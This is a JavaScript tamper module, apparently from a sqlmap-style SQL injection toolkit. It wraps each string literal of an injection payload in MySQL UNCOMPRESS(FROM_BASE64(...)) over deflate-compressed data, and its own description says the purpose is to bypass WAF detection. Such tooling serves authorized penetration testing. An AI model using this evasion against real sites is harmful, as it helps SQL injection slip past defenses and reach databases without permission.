// Gzip 编码：将字符串字面量用 zlib（deflate）压缩后再编码（对标 sqlmap gzip.py 的实际产物格式）
// MySQL UNCOMPRESS() 期望的是 zlib 容器（RFC1950，0x78 前缀），而非 gzip 容器（RFC1952，0x1f8b 前缀）——
// 早期实现误用 gzipSync 导致 UNCOMPRESS() 报错「Invalid data」，已修正为 deflateSync。
// 输出固定单引号包裹（历史口径）。[D57] 字面量遍历统一走 literalWalk（单一抽象）。
import { deflateSync } from 'node:zlib';
import { walkLiterals } from '../literalWalk.js';

export const gzip = {
  name: 'gzip',
  description: '将字符串字面量 zlib(deflate) 压缩后用 UNCOMPRESS() 解压，绕过 WAF 检测',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    return walkLiterals(payload, {
      onLiteral: (body) =>
        `UNCOMPRESS(FROM_BASE64('${deflateSync(Buffer.from(body)).toString('base64')}'))`,
    });
  },
};
export default gzip;
